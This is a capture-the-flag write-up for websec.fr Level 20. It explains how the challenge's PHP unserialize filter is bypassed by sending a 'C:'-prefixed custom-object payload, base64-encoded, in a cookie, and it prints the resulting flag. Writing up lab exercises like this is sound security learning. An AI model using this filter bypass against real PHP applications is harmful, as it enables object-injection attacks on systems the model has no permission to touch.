# Level 20

1. First, lets check what is written in http://websec.fr/level20/source.php
2. Then, we could find out : 
    ```
    if (isset ($_COOKIE['data'])) {
        $data = sanitize (base64_decode ($_COOKIE['data']));
    }
    ```
    So, we can first check out what is written in the cookie by decode it. Before doing it, lets input an item "flag" and see what happen. Remember to decode it by base64. You can decode it by the website : https://www.base64decode.org
    ```
    a:1:{i:0;s:4:"flag";}
    ```
3. Now, we have to know what it means. I search for a long time and get the information from the website : https://www.evonide.com/fuzzing-unserialize
    After you read the graph below you will know what does "a" "i" "s" and the number next to them means.
4. Then, after you know what it means, the only mission we have to do is to look in the source and check where is the vulnerable part. So here is the interesting part : 
    ```
    function sanitize($data) {
        /* i0n1c's bypass won't save you this time! (https://www.exploit-db.com/exploits/22547/) */
        if ( ! preg_match ('/[A-Z]:/', $data)) {
            return unserialize ($data);
        }

        if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:"/', $data )) {
            return unserialize ($data);
        }

        return false;
    }
    ```
5. Now, we have to know what we want --- an object named "flag"
    As you can see here : 
    ```
    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:"/', $data ))
    ```
    It means that I can not use "O" or "O+" to get the flag. If you read the websit carefully and you would find out that : 
    ```
    switch (yych) {
        case 'C':
        case 'O': goto yy13;
        case 'N': goto yy5;
        case 'R': goto yy2;
        case 'S': goto yy10;
        case 'a': goto yy11;
        case 'b': goto yy6;
        case 'd': goto yy8;
        case 'i': goto yy7;
        case 'o': goto yy12;
        case 'r': goto yy4;
        case 's': goto yy9;
        case '}': goto yy14;
        default:  goto yy16;
    }
    ```
    As you can see, "C" and "O" can reach the same place. So we have to make a custom object using "C" and named it "flag" to get the object "flag". Here is my payload : 
    ```
    C:4:"flag":1:{};
    ```
    Then lets encode it using base64 : 
    ```
    Qzo0OiJmbGFnIjoxOnt9Ow==
    ```
    Change the value of cookie and refresh the website then you will get the flag ~~~
6. Here is the flag : WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}
